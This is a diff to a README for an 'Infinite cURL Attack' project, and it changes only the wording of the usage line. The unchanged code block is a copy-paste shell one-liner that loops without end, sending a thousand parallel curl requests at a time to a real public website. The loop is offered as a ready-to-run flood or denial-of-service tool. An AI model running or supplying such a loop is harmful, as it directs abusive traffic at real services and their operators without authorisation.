@@ -3,7 +3,7 @@
 # Infinite_cURL_Attack
 Infinite cURL Attack
 
-**USAGE** : Copy-Paste-Edit the following code in the Terminal/CMD.
+**USAGE** : Copy-Paste-Edit the following code in the Terminal/CMD & press Enter.
 ```
 while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -I -v --header "Connection: keep-alive" "https://www.google.com"; done;
 ```
